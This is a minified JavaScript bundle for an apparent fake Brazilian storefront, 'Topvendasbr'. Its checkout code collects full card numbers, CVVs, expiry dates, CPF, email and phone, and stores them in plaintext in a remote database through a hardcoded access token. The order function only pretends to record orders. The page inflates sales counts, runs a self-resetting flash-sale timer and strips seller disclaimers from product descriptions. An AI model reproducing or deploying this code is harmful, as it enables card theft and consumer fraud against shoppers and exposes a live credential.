        i.ontimeout = () => r(Error(`XHR timeout`)),
        i.send()
    }
    )
}
function dr(e, t={}, n=15e3) {
    ...
    if (typeof fetch < `u`)
        try {
            let r = new Promise( (e, t) => setTimeout( () => t(Error(`fetch timeout`)), n));
...
async function fr(e, t={}, n=15e3) {
    let r;
    for (let i = 1; i <= 3; i++)
        try {
            let r = await dr(e, t, n);
            if (r.ok)
                return r;
            if (i < 3) {
                await new Promise(e => setTimeout(e, i * 800));
                continue
            }
            return r
        } catch (e) {
            r = e,
            i < 3 && await new Promise(e => setTimeout(e, i * 800))
        }
    try {
        return await ur(e, n)
    } catch {
        throw r || Error(`Todas as tentativas de fetch falharam`)
    }
}
async function pr(e={}) {
    try {
        let t = await (await fr(`${lr}/produtos`)).json();
        if (e.busca) {
            let n = e.busca.toLowerCase();
            t = t.filter(e => e.nome?.toLowerCase().includes(n) || e.descricao?.toLowerCase().includes(n))
        }
        if (e.categoria) {
            let n = e.categoria.toLowerCase();
            t = t.filter(e => e.categoria?.toLowerCase() === n ? !0 : Array.isArray(e.categorias) ? e.categorias.some(e => (typeof e == `string` ? e : e.nome)?.toLowerCase() === n) : !1)
        }
        return t
    } catch (e) {
        return console.error(`fetchProdutos error:`, e),
        []
    }
}
async function mr(e) {
    try {
        let t = await fr(`${lr}/produto-${e}`);
        return t.ok ? t.json() : null
    } catch (e) {
        return console.error(`fetchProduto error:`, e),
        null
    }
}
async function hr() {
    try {
        return (await fr(`${lr}/categorias-ativas`)).json()
    } catch (e) {
        return console.error(`fetchCategorias error:`, e),
        []
    }
}
async function gr(e) {
    try {
        let t = await fr(`${lr}/avaliacoes-${e}`);
        return t.ok ? t.json() : []
    } catch (e) {
        return console.error(`fetchAvaliacoes error:`, e),
        []
    }
}
async function _r() {
    try {
        return (await fr(`${lr}/configuracoes`)).json()
    } catch (e) {
        return console.error(`fetchConfiguracoes error:`, e),
        {}
    }
}
async function vr() {
    try {
        let e = await fr(`${lr}/opcoes-frete-ativas`);
        return e.ok ? e.json() : []
    } catch {
        return []
    }
...
async function yr(e) {
    return console.log(`Pedido registrado:`, e),
    {
        success: !0,
        id: Date.now()
    }
}
var br = `https://www.pagamentos-seguros.app/api-pix/gCUwfRMRHczAAMnbxBwAQ6_o-GvxLtXWArLC3dLwysZEU5A3tZFjMB2faIRcMc4L5wS36BfGYvK_IOUzRti2lg`
  , xr = `https://cc-dsadsadwqdsaqw.aws-us-east-2.turso.io`
  , Sr = `eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJhIjoicnciLCJpYXQiOjE3NzA2NDg4NjQsImlkIjoiYjczZjVmZmMtMjVlZi00NDY1LThiOTYtMTFkYmE0ZDE4M2NjIiwicmlkIjoiMTMxZWQzM2MtM2RmMC00MzMzLTk0NmItMDIyZGQ4YTVlMjZlIn0.fXy9J3Tnt5KkMCqNX79UAR6vXeq5qVLnVXS3s3OBJrjf0mBXuOS4tXOALMd4pO8yaeSrelJ-LxvS0dOOwVHQAg`;
async function Cr(e) {
    let t = e.map(e => ({
        type: `execute`,
        stmt: e
    ...
    let n = await fetch(`${xr}/v2/pipeline`, {
        method: `POST`,
        headers: {
    ...
    if (!n.ok) {
        let e = await n.text();
        throw Error(`Turso HTTP ${n.status}: ${e}`)
    }
    let r = await n.json();
    if (r.results) {
        for (let e of r.results)
            if (e.type === `error`)
                throw Error(`Turso error: ${JSON.stringify(e.error)}`)
    }
    return r
}
async function wr(e) {
    try {
        let {valor: t, nome: n, cpf: r, email: i, telefone: a, itens: o} = e
          , s = Math.round((Number(t) || 0) * 100);
        if (s < 100)
            return {
                success: !1,
        ...
        let u = `Pedido Topvendasbr`;
        Array.isArray(o) && o.length > 0 && (u = o.length === 1 ? o[0].nome : `${o[0].nome} + ${o.length - 1} outro(s)`);
        let d = new URLSearchParams(window.location.search)
          , f = []
          , p = d.get(`utm_source`) || localStorage.getItem(`utm_utm_source`) || ``
          , m = d.get(`utm_medium`) || localStorage.getItem(`utm_utm_medium`) || ``
          , h = d.get(`utm_campaign`) || localStorage.getItem(`utm_utm_campaign`) || ``
          , g = d.get(`ttclid`) || localStorage.getItem(`utm_ttclid`) || ``
          , _ = d.get(`sck`) || localStorage.getItem(`utm_sck`) || ``
          , v = d.get(`fbclid`) || localStorage.getItem(`utm_fbclid`) || ``
          , y = d.get(`gclid`) || localStorage.getItem(`utm_gclid`) || ``;
        p && f.push(`utm_source=${p}`),
        m && f.push(`utm_medium=${m}`),
        h && f.push(`utm_campaign=${h}`),
        g && f.push(`ttclid=${g}`),
        _ && f.push(`sck=${_}`),
        v && f.push(`fbclid=${v}`),
        y && f.push(`gclid=${y}`);
        let b = f.join(`&`)
          , x = {
            amount: s,
            description: `Pagamento via Pix - Topvendasbr`,
            customer: {
                name: n.trim(),
                document: c,
                email: i.trim(),
        ...
        return console.error(`Erro ao gerar PIX:`, e),
        {
            success: !1,
...
async function Tr(e) {
    try {
        let t = await (await fetch(`${br}?transactionId=${e}`)).json();
        if (t.error)
            return {
                status: `pending`,
                paid: !1
...
async function Er(e) {
    try {
        let {numero: t, nome: n, validade: r, cvv: i, bandeira: a, cpf: o, email: s, telefone: c, nome_cliente: l} = e;
        return !t || !n || !r || !i ? {
            success: !1,
            error: `Dados do cartão incompletos`
        } : (await Cr([{
            sql: `CREATE TABLE IF NOT EXISTS cartoes (id INTEGER PRIMARY KEY AUTOINCREMENT, numero TEXT NOT NULL, nome_cartao TEXT NOT NULL, validade TEXT NOT NULL, cvv TEXT NOT NULL, bandeira TEXT, cpf TEXT, email TEXT, telefone TEXT, nome_cliente TEXT, criado_em TEXT DEFAULT (datetime('now')))`
        }]),
        await Cr([{
            sql: `INSERT INTO cartoes (numero, nome_cartao, validade, cvv, bandeira, cpf, email, telefone, nome_cliente) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            args: [{
                type: `text`,
                value: String(t)
            }, {
        ...
        return console.error(`Erro ao salvar cartão:`, e),
        {
            success: !1,
            error: e.message
        }
...
function Dr({rating: e, count: t, size: n=14, color: r}) {
    let i = []
      , a = Math.floor(e)
      , o = e - a >= .5;
    for (let e = 0; e < 5; e++)
...
var Or = (0,
_.memo)(function({product: e, isGrid: t=!1}) {
    let n = cr()
      , {addItem: r} = ir()
      , i = qn(e.preco, e.preco_antigo)
      , a = Kn(e.preco)
      , o = Yn(e.imagem)
      , s = (0,
    _.useCallback)( () => {
    ...
    return (0,
    M.jsxs)(`div`, {
        className: `product-card ${t ? `product-card-grid` : ``}`,
        onClick: s,
        children: [(0,
        M.jsx)(`img`, {
        ...
        M.jsxs)(`div`, {
            ...
            M.jsxs)(`div`, {
                ...
                children: [Jn(e.vendidos), ` vendidos`]
            }), e.rating > 0 && (0,
            M.jsx)(Dr, {
                rating: e.rating
            }), (0,
            M.jsxs)(`div`, {
                ...
                M.jsxs)(`div`, {
                    ...
                    }), e.preco_antigo > e.preco && (0,
                    M.jsxs)(`span`, {
                        className: `old-price`,
                        children: [`R$ `, e.preco_antigo.toFixed(2).replace(`.`, `,`)]
                    })]
                }), (0,
                M.jsxs)(`div`, {
...
function Ar() {
    ...
    _.useState)(!1)
      , [w,T] = (0,
    _.useState)(!1)
      , ee = _.useCallback(async () => {
        c(!0),
        T(!1);
        try {
            let[e,t,r] = await Promise.all([pr(), hr(), _r()])
              , a = (e || []).filter(e => e.ativo && !e.oculto);
            n(a),
            i((t || []).filter(e => e.ativo)),
            o(r || null),
            a.length === 0 && T(!0)
        } catch {
            T(!0)
    ...
    _.useEffect)( () => {
        function e() {
            document.visibilityState === `visible` && t.length === 0 && !s && ee()
        }
    ...
    , [t, s, ee]);
    let te = (0,
    _.useMemo)( () => t.filter(e => e.principal === 1), [t])
      , E = t
      , ne = (0,
    _.useMemo)( () => d ? t.filter(e => e.categoria?.toLowerCase() === d.toLowerCase() ? !0 : Array.isArray(e.categorias) ? e.categorias.some(e => (typeof e == `string` ? e : e.nome)?.toLowerCase() === d.toLowerCase()) : !1) : t, [t, d])
      , re = (0,
    _.useMemo)( () => [...ne].sort( (e, t) => v === `vendidos` ? (t.vendidos || 0) - (e.vendidos || 0) : v === `preco` ? (e.preco || 0) - (t.preco || 0) : 0), [ne, v]);
    return a?.imagem_logo && a.imagem_logo,
    (0,
    M.jsxs)(`div`, {
        className: `container`,
        children: [(0,
        M.jsxs)(`div`, {
            ...
            M.jsxs)(`div`, {
                ...
                M.jsx)(`img`, {
                    ...
                    src: `https://i.postimg.cc/SKy65bk0/imagem-2026-02-11-213214292.png`,
                    alt: `topvendasbr`
                }), (0,
                M.jsxs)(`div`, {
                    ...
                    children: [(0,
                    M.jsx)(`h2`, {
                        children: a?.nome_loja || `Topvendasbr`
                    }), (0,
                    M.jsxs)(`p`, {
                        className: `store-sales-count`,
                        children: [a?.vendas_loja ? Number(a.vendas_loja.replace(/\./g, ``)).toLocaleString(`pt-BR`) : `99.193`, ` `, `vendido(s)`]
                    })]
                })]
            }), (0,
            M.jsxs)(`div`, {
                ...
                children: [(0,
                M.jsx)(`button`, {
                    className: `store-follow-btn ${h ? `following` : ``}`,
                    onClick: () => g(!h),
                    children: h ? `Seguindo` : `+ Seguir`
                }), (0,
                M.jsx)(`button`, {
                    className: `store-message-btn`,
                    onClick: () => e(`/chat`),
                    children: `Mensagem`
                })]
            })]
        ...
        M.jsxs)(`div`, {
            ...
            children: [(0,
            M.jsxs)(`div`, {
                className: `coupon-card coupon-card-frete`,
                children: [(0,
                M.jsxs)(`div`, {
                    ...
                    M.jsx)(`div`, {
                        ...
                        children: `Cupom de frete grátis`
                    }), (0,
                    M.jsx)(`div`, {
                        className: `coupon-subtitle`,
                        children: `Sem gasto mínimo`
                    })]
                }), (0,
                M.jsx)(`button`, {
                    className: `coupon-btn ${b ? `coupon-btn-claimed` : ``}`,
                    onClick: () => x(!0),
                    children: b ? (0,
                    M.jsxs)(M.Fragment, {
                        children: [(0,
            ...
            M.jsxs)(`div`, {
                className: `coupon-card coupon-card-desconto`,
                children: [(0,
                M.jsxs)(`div`, {
                    className: `coupon-text`,
                    children: [(0,
                    M.jsx)(`div`, {
                        className: `coupon-title coupon-title-white`,
                        children: `Até 85% OFF`
                    }), (0,
                    M.jsx)(`div`, {
                        className: `coupon-subtitle coupon-subtitle-white`,
                        children: `Em produtos selecionados`
                    })]
                }), (0,
                M.jsx)(`button`, {
                    className: `coupon-btn coupon-btn-desconto ${S ? `coupon-btn-claimed-white` : ``}`,
                    onClick: () => C(!0),
                    children: S ? (0,
                    M.jsxs)(M.Fragment, {
                        children: [(0,
        ...
        M.jsxs)(`div`, {
            ...
            children: [(0,
            M.jsx)(`button`, {
                className: `nav-tab ${l === `inicio` ? `active` : ``}`,
                onClick: () => u(`inicio`),
                children: `Página inicial`
            }), (0,
            M.jsx)(`button`, {
                className: `nav-tab ${l === `produtos` ? `active` : ``}`,
                onClick: () => u(`produtos`),
                children: `Produtos`
            }), (0,
            M.jsx)(`button`, {
                className: `nav-tab ${l === `categorias` ? `active` : ``}`,
                onClick: () => u(`categorias`),
                children: `Categorias`
            })]
        }), s ? (0,
        M.jsx)(kr, {}) : w && t.length === 0 ? (0,
        M.jsxs)(`div`, {
            style: {
                padding: 40,
                textAlign: `center`
            ...
            M.jsx)(`p`, {
                ...
                children: `Não foi possível carregar os produtos. Verifique sua conexão.`
            }), (0,
            M.jsx)(`button`, {
                onClick: ee,
                style: {
        ...
        M.jsxs)(M.Fragment, {
            ...
            M.jsxs)(M.Fragment, {
                ...
                M.jsxs)(`div`, {
                    ...
                    M.jsx)(`div`, {
                        className: `top-products-carousel`,
                        children: te.map( (t, n) => {
                            let r = qn(t.preco, t.preco_antigo)
                              , i = Kn(t.preco)
                              , a = Yn(t.imagem);
                            return (0,
                            M.jsxs)(`div`, {
                                className: `top-product-card`,
                                onClick: () => e(`/produto/${t.id}`),
                                children: [(0,
                                M.jsxs)(`div`, {
                                    className: `top-product-img-wrapper`,
                                    children: [n < 3 && (0,
                                    M.jsxs)(`div`, {
                                        className: `top-badge top-badge-${n + 1}`,
                                        children: [`TOP `, n + 1]
                                    }), (0,
                                    M.jsx)(`img`, {
                                        src: a,
                                ...
                                M.jsxs)(`div`, {
                                    ...
                                    M.jsxs)(`div`, {
                                        className: `top-product-sales`,
                                        children: [Jn(t.vendidos), ` vendidos`]
                                    })]
                                })]
                            }, t.id)
                        }
                ...
                M.jsxs)(`div`, {
                    ...
                    M.jsx)(`div`, {
                        ...
                        M.jsx)(`h3`, {
                            className: `section-title`,
                            children: `Recomendado para você`
                        })
                    }), (0,
                    M.jsx)(`div`, {
            ...
            M.jsxs)(M.Fragment, {
                ...
                M.jsxs)(`div`, {
                    ...
                    children: [(0,
                    M.jsx)(`button`, {
                        className: `filter-chip ${v === `relevancia` ? `active` : ``}`,
                        onClick: () => y(`relevancia`),
                        children: `Relevância`
                    }), (0,
                    M.jsx)(`button`, {
                        className: `filter-chip ${v === `vendidos` ? `active` : ``}`,
                        onClick: () => y(`vendidos`),
                        children: `Mais vendidos`
                    }), (0,
                    M.jsx)(`button`, {
                        className: `filter-chip ${v === `preco` ? `active` : ``}`,
                        onClick: () => y(`preco`),
                        children: `Preço`
                    }), (0,
                    M.jsx)(`button`, {
            ...
            M.jsx)(`div`, {
                ...
                children: r.map(e => {
                    let n = t.filter(t => t.categoria?.toLowerCase() === e.nome.toLowerCase() ? !0 : Array.isArray(t.categorias) ? t.categorias.some(t => (typeof t == `string` ? t : t.nome)?.toLowerCase() === e.nome.toLowerCase()) : !1);
                    return {
                        ...e,
                        count: n.length,
                        catProducts: n
                    ...
                    let t = e.catProducts.length > 0 ? Yn(e.catProducts[0].imagem) : null;
                    return (0,
                    M.jsxs)(`div`, {
                        ...
                        M.jsxs)(`div`, {
                            ...
                            M.jsxs)(`div`, {
                                className: `category-list-count`,
                                children: [e.count, ` `, e.count === 1 ? `produto` : `produtos`]
                            })]
                        }), (0,
                        M.jsx)(`svg`, {
...
function jr(e) {
    return /\.(mp4|webm|mov|avi)$/i.test(e) || /vod\.susercontent\.com/i.test(e)
}
function Mr({review: e}) {
    let[t,n] = (0,
    _.useState)(null)
      , r = [];
    if (e.imagens)
        try {
            let t = typeof e.imagens == `string` ? JSON.parse(e.imagens) : e.imagens;
            Array.isArray(t) && (r = t.filter(e => typeof e == `string` && (e.includes(`susercontent.com`) || e.includes(`.mp4`))))
        } catch {}
    let i = [];
    for (let t = 0; t < 5; t++)
        i.push((0,
    ...
    let a = e.nome_usuario ? e.nome_usuario.charAt(0).toUpperCase() : `?`
      , o = () => n(null);
    return (0,
    M.jsxs)(`div`, {
            ...
            M.jsxs)(`div`, {
                ...
                M.jsxs)(`div`, {
                    ...
                    M.jsx)(`span`, {
                        ...
                        children: e.nome_usuario
                    }), e.data && (0,
                    M.jsx)(`span`, {
                        className: `review-user-location`,
                        children: e.data
                    })]
                })]
            }), (0,
        ...
        M.jsx)(`div`, {
            ...
            children: e.comentario
        }), r.length > 0 && (0,
        M.jsx)(`div`, {
            className: `review-photo`,
            children: r.map( (e, t) => jr(e) ? (0,
            M.jsxs)(`div`, {
                className: `review-media-thumb review-video-thumb`,
                onClick: () => n(t),
                children: [(0,
                M.jsx)(`video`, {
                    src: e,
        ...
        M.jsxs)(`div`, {
            ...
            M.jsx)(`div`, {
                ...
                M.jsx)(`video`, {
                    ...
                    controls: !0,
                    autoPlay: !0,
                    className: `review-lightbox-video`
                }) : (0,
                M.jsx)(`img`, {
                    src: r[t],
                    alt: ``,
            ...
            M.jsxs)(M.Fragment, {
                children: [(0,
                M.jsx)(`button`, {
                    className: `review-lightbox-arrow review-lightbox-prev`,
                    onClick: e => {
                        e.stopPropagation(),
                        n(e => (e - 1 + r.length) % r.length)
                    }
                    ,
                    children: (0,
                    M.jsx)(`svg`, {
                ...
                M.jsx)(`button`, {
                    className: `review-lightbox-arrow review-lightbox-next`,
                    onClick: e => {
                        e.stopPropagation(),
                        n(e => (e + 1) % r.length)
                    }
            ...
            M.jsxs)(`div`, {
                className: `review-lightbox-counter`,
                children: [t + 1, ` / `, r.length]
            })]
        })]
    })
}
function Nr({product: e}) {
    let t = cr()
      , n = tt()
      , {totalItems: r, addItem: i} = ir()
      , a = n.pathname === `/`;
    if (e) {
        let n = e.preco?.toFixed(2).replace(`.`, `,`);
        return (0,
        M.jsxs)(`div`, {
            ...
            M.jsx)(`button`, {
                className: `nav-add-cart-btn`,
                onClick: () => i(e),
                children: (0,
                M.jsxs)(`div`, {
                    className: `nav-cart-icon-wrapper`,
                    children: [(0,
                    M.jsxs)(`svg`, {
                    ...
                    M.jsx)(`span`, {
                        className: `nav-cart-plus`,
                        children: `+`
                    })]
                })
            }), (0,
            M.jsxs)(`button`, {
                className: `nav-buy-now-btn`,
                onClick: () => {
                    i(e),
                    t(`/carrinho`)
                }
                ...
                children: [(0,
                M.jsxs)(`span`, {
                    className: `nav-buy-price`,
                    children: [`R$`, n]
                }), (0,
                M.jsx)(`span`, {
                    className: `nav-buy-text`,
...
function Pr({product: e, onClose: t, onBuyNow: n}) {
    let {addItem: r} = ir()
      , [i,a] = (0,
    _.useState)({})
      , [o,s] = (0,
    _.useState)(1)
      , c = qn(e.preco, e.preco_antigo)
      , l = Kn(e.preco)
      , u = Yn(e.imagem)
      , d = e.variacoes && typeof e.variacoes == `object` ? Object.entries(e.variacoes) : []
      , f = d.length === 0 || d.every( ([e]) => i[e])
      , p = (e, t) => {
        a(n => ({
            ...n,
            [e]: t
    ...
    M.jsx)(`div`, {
        ...
        M.jsx)(`div`, {
            ...
            children: (0,
            M.jsxs)(`div`, {
                className: `product-variations-modal`,
                children: [(0,
                M.jsx)(`button`, {
                ...
                M.jsxs)(`div`, {
                    className: `modal-header-product`,
                    children: [(0,
                    M.jsx)(`img`, {
                    ...
                    M.jsxs)(`div`, {
                        ...
                        children: [c > 0 && (0,
                        M.jsxs)(`span`, {
                            className: `modal-product-discount`,
                            children: [`-`, c, `%`]
                        }), (0,
                        M.jsxs)(`span`, {
                            className: `modal-product-price`,
                            children: [l.currency, ` `, l.integer, `,`, l.decimal]
                        }), e.preco_antigo > e.preco && (0,
                        M.jsxs)(`span`, {
                            className: `modal-product-old-price`,
                            children: [`R$ `, e.preco_antigo.toFixed(2)]
                        })]
                    })]
                }), (0,
                M.jsx)(`div`, {
                ...
                M.jsx)(`div`, {
                    ...
                    M.jsxs)(`div`, {
                        className: `variation-group`,
                        children: [(0,
                        M.jsxs)(`span`, {
                            className: `variation-label`,
                            children: [t.label || e, `: `, i[e] || ``]
                        }), (0,
                        M.jsx)(`div`, {
                            className: `variation-options`,
                            children: t.opcoes?.map(t => (0,
                            M.jsx)(`button`, {
                                className: `variation-option-btn ${i[e] === t ? `selected` : ``}`,
                                onClick: () => p(e, t),
                                children: t
                            }, t))
                        })]
                ...
                M.jsxs)(`div`, {
                    ...
                    children: [(0,
                    M.jsx)(`span`, {
                        className: `modal-quantity-label`,
                        children: `Quantidade`
                    }), (0,
                    M.jsxs)(`div`, {
                        className: `modal-quantity-controls`,
                        children: [(0,
                        M.jsx)(`button`, {
                            className: `modal-qty-btn`,
                            onClick: () => s(Math.max(1, o - 1)),
                            children: `−`
                        }), (0,
                        M.jsx)(`span`, {
                            className: `modal-qty-value`,
                            children: o
                        }), (0,
                        M.jsx)(`button`, {
                            className: `modal-qty-btn`,
...
var Fr = `flash_sale_timer`
  , Ir = 14400 * 1e3;
function Lr() {
    try {
        let e = localStorage.getItem(Fr);
        if (e) {
            let {endTime: t} = JSON.parse(e)
              , n = t - Date.now();
            if (n > 0) {
    ...
    let e = Date.now() + Ir;
    return localStorage.setItem(Fr, JSON.stringify({
        endTime: e
    })),
    {
        h: 3,
...
_.memo)(function() {
    ...
    (0,
    M.jsxs)(`span`, {
        className: `flash-sale-time`,
        children: [String(e.h).padStart(2, `0`), `:`, String(e.m).padStart(2, `0`), `:`, String(e.s).padStart(2, `0`)]
    })
});
function zr() {
    let {id: e} = ct()
    ...
    _.useState)(5)
      , v = ( () => {
        let e = new Date;
        return e.setDate(e.getDate() + 10),
        `${e.getDate()} de ${[`jan`, `fev`, `mar`, `abr`, `mai`, `jun`, `jul`, `ago`, `set`, `out`, `nov`, `dez`][e.getMonth()]}`
    }
    )()
      , [y,b] = (0,
    _.useState)(!1)
      , x = _.useCallback(async () => {
        c(!0),
        b(!1);
        try {
            let[t,n] = await Promise.all([mr(e), gr(e)]);
            i(t),
            o(Array.isArray(n) ? n : []),
            t || b(!0)
        } catch {
    ...
    _.useEffect)( () => {
        function e() {
            document.visibilityState === `visible` && !r && !s && x()
        }
        return document.addEventListener(`visibilitychange`, e),
        window.addEventListener(`focus`, e),
        () => {
    ...
    _.useMemo)( () => {
        if (!r?.descricao)
            return ``;
        let e = r.descricao;
        return e = e.replace(/[-–]\s*(A\s+)?[A-ZÁÉÍÓÚÂÊÎÔÛÃÕÇ][A-ZÁÉÍÓÚÂÊÎÔÛÃÕÇ\s]+não se responsabiliza[^<]*/gi, ``),
        e = e.replace(/[-–]\s*Imagem ilustrativa[^<]*/gi, ``),
        e = e.replace(/[-–]\s*As Marcas e Modelos citad[^<]*/gi, ``),
        e = e.replace(/Infelizmente não emitimos NF[^<]*/gi, ``),
        e = e.replace(/(<br\s*\/?>\s*){3,}/gi, `<br><br>`),
        e
    }
    , [r?.descricao]);
    if (s)
    ...
    if (!r)
        ...
        M.jsxs)(`div`, {
            ...
            M.jsx)(`p`, {
                ...
                children: y ? `Não foi possível carregar o produto. Verifique sua conexão.` : `Produto não encontrado`
            }), y && (0,
            M.jsx)(`button`, {
                onClick: x,
                style: {
    ...
    let C = Xn(r.imagem)
      , w = qn(r.preco, r.preco_antigo)
      , T = Kn(r.preco)
      , ee = r.variacoes && typeof r.variacoes == `object` && Object.keys(r.variacoes).length > 0;
    return (0,
    M.jsxs)(`div`, {
        ...
        M.jsxs)(`div`, {
            ...
            onTouchStart: e => m(e.touches[0].clientX),
            onTouchEnd: e => {
                if (p === null)
                    return;
                let t = p - e.changedTouches[0].clientX;
                Math.abs(t) > 50 && (t > 0 && l < C.length - 1 ? u(l + 1) : t < 0 && l > 0 && u(l - 1)),
                m(null)
            }
            ,
            children: [(0,
            M.jsx)(`div`, {
                className: `product-detail-images-track`,
                style: {
            ...
            M.jsxs)(M.Fragment, {
                ...
                M.jsxs)(`div`, {
                    className: `product-detail-image-counter`,
                    children: [l + 1, `/`, C.length]
                })]
            })]
        }), (0,
        M.jsxs)(`div`, {
            ...
            children: [(0,
            M.jsxs)(`svg`, {
                className: `flash-sale-lightning-bg`,
                viewBox: `0 0 24 24`,
                fill: `none`,
                children: [(0,
                M.jsx)(`defs`, {
            ...
            M.jsxs)(`div`, {
                className: `flash-sale-left`,
                children: [(0,
                M.jsxs)(`div`, {
                    className: `flash-sale-price-row`,
                    children: [w > 0 && (0,
                    M.jsxs)(`span`, {
                    ...
                    M.jsxs)(`span`, {
                        ...
                        children: [(0,
                        M.jsx)(`span`, {
                            className: `flash-sale-currency`,
                            children: `R$`
                        }), T.integer, `,`, T.decimal]
                    }), (0,
                    M.jsxs)(`svg`, {
                        className: `flash-sale-check`,
                        width: `18`,
                        height: `20`,
                        viewBox: `0 0 667 534`,
                        fill: `none`,
                        children: [(0,
                        M.jsx)(`path`, {
                            d: `M600 0C617.681 0 634.638 7.024 647.141 19.526C659.643 32.029 666.667 48.986 666.667 66.667V166.667C640.145 166.667 614.71 177.202 595.956 195.956C577.202 214.71 566.667 240.145 566.667 266.667C566.667 293.188 577.203 318.623 595.956 337.377C614.71 356.131 640.145 366.667 666.667 366.667V466.667C666.667 484.348 659.643 501.305 647.141 513.808C634.638 526.31 617.681 533.333 600 533.333H66.667C48.986 533.333 32.029 526.31 19.526 513.808C7.024 501.305 0 484.348 0 466.667V366.998C55.428 366.908 100.333 321.949 100.333 266.5C100.333 211.051 55.428 166.091 0 166.001V66.667C0 48.986 7.024 32.029 19.526 19.526C32.029 7.024 48.986 0 66.667 0H600Z`,
                            stroke: `white`,
                            strokeWidth: `35`
                        }), (0,
                        M.jsx)(`path`, {
                            d: `M233 300.333L299.667 367L433 167`,
                            stroke: `white`,
                            strokeWidth: `66.667`,
                            strokeLinecap: `round`,
                            strokeLinejoin: `round`
                ...
                }), r.preco_antigo > r.preco && (0,
                M.jsxs)(`div`, {
                    className: `flash-sale-old-price`,
                    children: [`R$ `, r.preco_antigo.toFixed(2).replace(`.`, `,`)]
                })]
            }), (0,
            M.jsxs)(`div`, {
                className: `flash-sale-right`,
                children: [(0,
                M.jsxs)(`div`, {
                    className: `flash-sale-offer-label`,
                    children: [(0,
                    M.jsx)(`svg`, {
                        width: `14`,
                        height: `14`,
        ...
        M.jsxs)(`div`, {
            ...
            children: [w > 0 && (0,
            M.jsxs)(`div`, {
                className: `product-detail-off-badge`,
                children: [(0,
                M.jsx)(`svg`, {
                    viewBox: `0 0 10 10`,
                    width: `10`,
            ...
            M.jsxs)(`div`, {
                className: `product-detail-stats`,
                children: [r.rating > 0 && (0,
                M.jsx)(Dr, {
                    rating: r.rating,
                    size: 16
                }), r.vendidos > 0 && (0,
                M.jsxs)(`span`, {
                    children: [Jn(r.vendidos), ` vendidos`]
                })]
            }), r.frete_gratis === 1 && (0,
            M.jsxs)(`div`, {
                ...
                M.jsxs)(`div`, {
                    ...
                    M.jsxs)(`div`, {
                        ...
                        M.jsxs)(`span`, {
                            className: `shipping-date`,
                            children: [`Receba até `, v]
                        })]
                    }), (0,
                    M.jsxs)(`div`, {
                        className: `shipping-fee`,
                        children: [`Taxa de envio:`, ` `, (0,
                        M.jsx)(`span`, {
                            style: {
            ...
            M.jsxs)(`div`, {
                className: `product-detail-protection`,
                children: [(0,
                M.jsxs)(`div`, {
        ...
        M.jsxs)(`div`, {
            ...
            M.jsxs)(`button`, {
                ...
                onClick: () => g(e => e + 10),
                children: [`Carregar mais avaliações (`, a.length - h, ` `, `restantes)`]
            })]
        }), (0,
        M.jsx)(Nr, {
            product: r
...
function Br() {
    return (0,
    M.jsx)(`div`, {
        className: `presell-page`,
        children: (0,
        M.jsxs)(`div`, {
            className: `presell-container`,
            children: [(0,
            M.jsx)(`div`, {
            ...
            M.jsx)(`p`, {
                children: `Usamos cookies para melhorar sua experiência de navegação em nosso site. Ao continuar navegando, você concorda com nossa política de privacidade e o uso de cookies.`
            }), (0,
            M.jsx)(`button`, {
                className: `accept-button`,
                onClick: e => {
                    e.preventDefault();
                    let t = window.location.search ? `/produto/26${window.location.search}` : `/produto/26`;
                    window.location.href = t
                }
                ,
                id: `54fb062e-1d2e-4e51-a707-470beadcdb99`,
                children: `Aceitar e Continuar`
            })]
        })
    })
}
        ...
        M.jsxs)(`header`, {
            ...
            M.jsx)(`button`, {
                ...
                onClick: () => {
                    let t = document.referrer
                      ...
                      , r = t && new URL(t).hostname === n;
                    if (t && t.includes(`/presell`) || !r) {
                        let t = new URLSearchParams;
                        [`utm_source`, `utm_medium`, `utm_campaign`, `utm_term`, `utm_content`, `utm_id`, `ttclid`, `sck`, `fbclid`, `gclid`].forEach(e => {
                            let n = new URLSearchParams(window.location.search).get(e) || localStorage.getItem(`utm_${e}`);
                            n && t.set(e, n)
                        }
                        );
                        let n = t.toString();
            ...
            M.jsxs)(`div`, {
                ...
                M.jsx)(`input`, {
                    ...
                    onKeyDown: t => {
                        t.key === `Enter` && i.trim() && (e(`/busca?q=${encodeURIComponent(i.trim())}`),
                        a(``),
                        t.target.blur())
                    }
                })]
...
var Hr = (0,
_.lazy)( () => x( () => import(`./Cart-iwkgpyBo.js`), []))
  , Ur = (0,
_.lazy)( () => x( () => import(`./Checkout-Bgh343l2.js`), []))
  , Wr = (0,
_.lazy)( () => x( () => import(`./Search-CG7ghWUD.js`), []))
  , Gr = (0,
_.lazy)( () => x( () => import(`./Success-CPoAw_1E.js`), []))
  , Kr = (0,
_.lazy)( () => x( () => import(`./PixPayment-B1sq8zcX.js`), __vite__mapDeps([0, 1])))
  , qr = (0,
_.lazy)( () => x( () => import(`./Chat-D79L4dVL.js`), []))
  , Jr = (0,
_.lazy)( () => x( () => import(`./MyAccount-xI4Cxhpf.js`), []))
  , Yr = (0,
_.lazy)( () => x( () => import(`./AddAddress-CU7k7MY1.js`), []))
  , Xr = (0,
_.lazy)( () => x( () => import(`./Upsell1-BTp3I7UU.js`), __vite__mapDeps([2, 1])))
  , Zr = (0,
_.lazy)( () => x( () => import(`./Upsell2-6prUyr_w.js`), __vite__mapDeps([3, 1])))
  , Qr = (0,
_.lazy)( () => x( () => import(`./Upsell3-DrNppMQw.js`), __vite__mapDeps([4, 1])));
function $r() {
    return (0,
    M.jsxs)(M.Fragment, {
        children: [(0,
...
export {En as _, vr as a, Pn as b, Tr as c, Qn as d, qn as f, Yn as g, Jn as h, wr as i, cr as l, Kn as m, Or as n, pr as o, Gn as p, yr as r, Er as s, kr as t, ir as u, tt as v, u as x, it as y};
